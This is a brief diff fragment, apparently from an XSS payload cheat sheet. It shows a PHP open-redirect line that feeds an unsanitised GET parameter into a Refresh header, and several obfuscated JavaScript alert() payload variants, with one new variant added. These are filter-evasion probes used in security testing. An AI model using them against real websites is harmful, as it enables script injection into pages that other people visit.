@@ -986,3 +986,4 @@ header('Refresh: 0; URL='.$_GET['param']);
 - `top[8680439..toString(30)](1)`
 - `alert?.()`
 - &#96;`${alert``}`&#96; (The payload should include leading and trailing backticks.) 
+- `(alert())`
